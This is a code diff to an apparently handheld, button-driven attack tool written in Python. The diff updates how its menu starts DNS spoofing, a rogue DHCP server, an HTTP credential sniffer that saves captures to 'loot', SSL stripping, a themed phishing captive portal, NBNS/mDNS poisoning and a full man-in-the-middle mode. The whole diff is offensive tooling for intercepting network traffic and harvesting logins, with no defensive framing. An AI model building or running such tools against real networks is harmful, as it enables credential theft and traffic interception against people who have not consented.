@@ -110,12 +110,9 @@ def op_dns_spoof(m, iface, gw_ip, target_ip):
         return
 
     stop = threading.Event()
+    m.stop_flag.clear()
     try:
-        spoofer = m.DNSSpoofer(
-            iface=iface,
-            target_ip=target_ip,
-            spoof_map={"*": my_ip},
-        )
+        spoofer = m.DNSSpoofer(iface, my_ip, rules={"*": my_ip})
         t = threading.Thread(target=spoofer.start, daemon=True)
         t.start()
         log(f"DNS_SPOOF_START target={target_ip}")
@@ -131,11 +128,12 @@ def op_dns_spoof(m, iface, gw_ip, target_ip):
     wait_for_btn(["KEY3", "LEFT", "OK"])
 
 
-def op_dhcp_spoof(m, iface):
+def op_dhcp_spoof(m, iface, attacker_ip):
     """Start DHCPSpoofer (rogue DHCP server)."""
     stop = threading.Event()
+    m.stop_flag.clear()
     try:
-        spoofer = m.DHCPSpoofer(iface=iface)
+        spoofer = m.DHCPSpoofer(iface, attacker_ip)
         t = threading.Thread(target=spoofer.start, daemon=True)
         t.start()
         log("DHCP_SPOOF_START")
@@ -154,12 +152,9 @@ def op_dhcp_spoof(m, iface):
 def op_http_sniffer(m, iface):
     """Start HTTPSniffer — extract credentials from intercepted HTTP."""
     stop = threading.Event()
-    creds = []
+    m.stop_flag.clear()
     try:
-        sniffer = m.HTTPSniffer(
-            iface=iface,
-            loot_callback=lambda c: creds.append(c),
-        )
+        sniffer = m.HTTPSniffer(iface)
         t = threading.Thread(target=sniffer.start, daemon=True)
         t.start()
         log("HTTP_SNIFF_START")
@@ -171,7 +166,7 @@ def op_http_sniffer(m, iface):
             elapsed = int(time.time() - t_start)
             clear_buf(DRAW)
             draw_running(DRAW, "HTTP SNIFF",
-                         line1=f"{len(creds)} creds", elapsed=elapsed)
+                         line1="sniffing HTTP", elapsed=elapsed)
             push(LCD, IMAGE)
             btn, last_t = read_btn(last_t)
             if btn in ("KEY3", "LEFT"):
@@ -180,8 +175,8 @@ def op_http_sniffer(m, iface):
 
         sniffer.stop()
         t.join(timeout=3)
-        log(f"HTTP_SNIFF_STOP creds={len(creds)}")
-        draw_result(DRAW, "HTTP DONE", [f"{len(creds)} creds captured", "saved to loot"],
+        log("HTTP_SNIFF_STOP")
+        draw_result(DRAW, "HTTP DONE", ["creds saved to loot"],
                     color=C["GOOD"])
     except Exception as e:
         log(f"http_sniffer error: {e}")
@@ -193,8 +188,9 @@ def op_http_sniffer(m, iface):
 def op_ssl_strip(m, iface):
     """Start SSLStripper — downgrade HTTPS to HTTP."""
     stop = threading.Event()
+    m.stop_flag.clear()
     try:
-        stripper = m.SSLStripper(iface=iface)
+        stripper = m.SSLStripper(iface)
         t = threading.Thread(target=stripper.start, daemon=True)
         t.start()
         log("SSL_STRIP_START")
@@ -210,7 +206,7 @@ def op_ssl_strip(m, iface):
     wait_for_btn(["KEY3", "LEFT", "OK"])
 
 
-def op_captive_portal(m, iface):
+def op_captive_portal(m, iface, attacker_ip):
     """Launch captive portal — theme selection then start."""
     themes = ["wifi", "hotel", "corporate", "coffee", "isp"]
     sel    = 0
@@ -239,8 +235,9 @@ def op_captive_portal(m, iface):
         time.sleep(0.05)
 
     stop = threading.Event()
+    m.stop_flag.clear()
     try:
-        portal = m.CaptivePortal(iface=iface, theme=theme)
+        portal = m.CaptivePortal(attacker_ip, theme=theme)
         t = threading.Thread(target=portal.start, daemon=True)
         t.start()
         log(f"CAPTIVE_START theme={theme}")
@@ -256,11 +253,12 @@ def op_captive_portal(m, iface):
     wait_for_btn(["KEY3", "LEFT", "OK"])
 
 
-def op_nbns_poison(m, iface):
+def op_nbns_poison(m, iface, attacker_ip):
     """Start NBNS/mDNS poisoner."""
     stop = threading.Event()
+    m.stop_flag.clear()
     try:
-        poisoner = m.NBNSPoisoner(iface=iface)
+        poisoner = m.NBNSPoisoner(iface, attacker_ip)
         t = threading.Thread(target=poisoner.start, daemon=True)
         t.start()
         log("NBNS_START")
@@ -355,7 +353,7 @@ def main():
                     op_dns_spoof(m, iface, gw_ip, host[0])
 
             elif choice == "DHCP SPOOF":
-                op_dhcp_spoof(m, iface)
+                op_dhcp_spoof(m, iface, attacker_ip)
 
             elif choice == "HTTP SNIFFER":
                 op_http_sniffer(m, iface)
@@ -364,10 +362,10 @@ def main():
                 op_ssl_strip(m, iface)
 
             elif choice == "CAPTIVE PORTAL":
-                op_captive_portal(m, iface)
+                op_captive_portal(m, iface, attacker_ip)
 
             elif choice == "NBNS POISON":
-                op_nbns_poison(m, iface)
+                op_nbns_poison(m, iface, attacker_ip)
 
             elif choice == "FULL MITM":
                 op_full_mitm(m, iface, attacker_ip, gw_ip)
